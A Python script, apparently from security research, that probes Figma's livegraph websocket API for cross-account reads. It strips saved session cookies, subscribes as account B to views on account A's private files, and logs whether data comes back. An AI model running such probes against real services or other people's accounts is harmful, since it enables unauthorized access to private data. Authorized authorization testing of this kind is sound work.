# -*- coding: utf-8 -*-
"""B→A 攻击者视角对照：无门控 fileKey view 是否有越权读
基线(A owner, 已有): CalendarFileByKey/FileExpirationView/GenericMakeCutoverStatusByFileKey/HasCollectionsView/FileFeaturesEnabled 均有数据
本轮: B 绝对纯净 cookie → A 私有文件 (A_MAKE/A_FILE)；匿名 → A 私有文件
判据: B/匿名 拿到 name/signedThumbnailUrl/checkpointClientMeta = 越权候选; 空壳 = 权限门在计算器层
"""
import sys, json, io, asyncio, time, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import websockets

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"      # A 私有 Make 文件
A_FILE = "u5aqDppy2y02845uEviKF5"      # A 私有 mention-test-a
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"


def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split("; "):
        if "=" in p:
            k, v = p.split("=", 1)
            parts[k] = v
    d = json.loads(urllib.parse.unquote(parts.get("__Host-figma.authn", "")))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts["__Host-figma.authn"] = urllib.parse.quote(json.dumps(d, separators=(",", ":")))
    if "__Host-figma.embed" in parts:
        try:
            ne = json.loads(urllib.parse.unquote(parts["__Host-figma.embed"]))
            ne = {k: v for k, v in ne.items() if k == keep_uid}
            if ne:
                parts["__Host-figma.embed"] = urllib.parse.quote(json.dumps(ne, separators=(",", ":")))
            else:
                del parts["__Host-figma.embed"]
                parts.pop("__Host-figma.embed.mac", None)
        except Exception:
            pass
    return "; ".join(f"{k}={v}" for k, v in parts.items())


rawA = io.open("ws_cookie_A_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
rawB = io.open("ws_cookie_B_new.txt", encoding="utf-8").read().strip().replace("\n", "; ")
ABS_A = make_abs_pure(rawA, A_UID)
ABS_B = make_abs_pure(rawB, B_UID)
OUT = io.open("_ws_pure_probe_B_out.txt", "w", encoding="utf-8")


def lg_url(fk, uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")


async def sub(view, args, fk, uid, ck, wait=8):
    frames = []
    try:
        async with websockets.connect(lg_url(fk, uid),
                                      additional_headers={"User-Agent": UA, "Cookie": ck,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=30) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{fk}"},
                                      "clientRequestedVersion": 2}))
            for _ in range(3):
                m = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(m, str) and "authSuccess" in m:
                    break
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view,
                                      "viewHash": "0" * 32, "loadType": "initial",
                                      "args": args}))
            deadline = time.time() + wait
            while time.time() < deadline:
                try:
                    m = await asyncio.wait_for(ws.recv(), timeout=3)
                except asyncio.TimeoutError:
                    continue
                if isinstance(m, str):
                    frames.append(m)
                    if "viewLoaded" in m or "viewSubscriptionFailed" in m:
                        break
    except Exception as e:
        return [f"ERR {type(e).__name__}: {str(e)[:80]}"]
    return frames


def status_tag(frames):
    import re
    txt = " ".join(frames)
    m = re.search(r'Status code = (\d+). Error message = .*?"message":"([^"]*)"', txt)
    if m:
        return f"code={m.group(1)} msg={m.group(2)[:60]}"
    has = False
    for f in frames:
        if '"initial":{' in f and '"initial":{}' not in f:
            has = True
        if '"data":{' in f and '"data":{}' not in f:
            has = True
    if has:
        return "有数据"
    if "viewSubscriptionFailed" in txt:
        return "订阅失败"
    return "空壳"


async def run_case(label, view, args, fk, uid, ck):
    frames = await sub(view, args, fk, uid, ck, wait=7)
    tag = status_tag(frames)
    print(f"[{label}] {view} -> {tag} 帧={len(frames)}")
    OUT.write(f"\n===== [{label}] {view} args={json.dumps(args)} -> {tag} =====\n")
    for f in frames:
        OUT.write(f"  {f[:1800]}\n")
    return tag


def fk_args(filekey, **extra):
    a = {"fileKey": filekey}
    a.update(extra)
    return a


# 只测 _ws_pure_probe 中"有数据"的 5 个 view
VIEWS = [
    ("HasCollectionsView", lambda fk: fk_args(fk)),
    ("GenericMakeCutoverStatusByFileKey", lambda fk: fk_args(fk)),
    ("FileExpirationView", lambda fk: {"figFileKey": fk}),
    ("CalendarFileByKey", lambda fk: fk_args(fk)),
    ("FileFeaturesEnabled", lambda fk: fk_args(fk)),
]


async def main():
    print("=== 第一轮: B(纯净)→A 私有 Make 文件 ===")
    r1 = {}
    for name, mk in VIEWS:
        r1[name] = await run_case("B→A_MAKE", name, mk(A_MAKE), A_MAKE, B_UID, ABS_B)
    print("\n=== 第二轮: B(纯净)→A 私有 mention 文件 ===")
    for name, mk in VIEWS:
        await run_case("B→A_FILE", name, mk(A_FILE), A_FILE, B_UID, ABS_B)
    print("\n=== 第三轮: A(纯净)→A 私有文件(基线复核) ===")
    for name, mk in VIEWS:
        await run_case("A→A_MAKE", name, mk(A_MAKE), A_MAKE, A_UID, ABS_A)


asyncio.run(main())
OUT.close()
print("\n完成")
